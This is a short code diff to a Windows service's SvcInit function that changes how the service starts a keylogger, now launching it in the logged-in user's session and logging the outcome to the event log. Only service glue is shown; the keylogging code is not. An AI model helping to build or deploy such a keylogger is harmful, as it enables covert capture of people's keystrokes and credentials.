@@ -172,15 +172,13 @@ VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
 
     _tprintf(TEXT("Service initialized and running\n"));
 
-
-    if (!LaunchKeylogger())
+    if (!LaunchKeyloggerInUserSession())
     {
-        _tprintf(TEXT("Failed to launch keylogger\n"));
-        SvcReportEvent(TEXT("LaunchKeylogger"));
+        SvcReportEvent(TEXT("Cannot launch keylogger in user session"));
     }
     else
     {
-        _tprintf(TEXT("Keylogger launched successfully\n"));
+        SvcReportEvent(TEXT("Keylogger successfully launched in user session"));
     }
 
     // Check whether to stop the service.
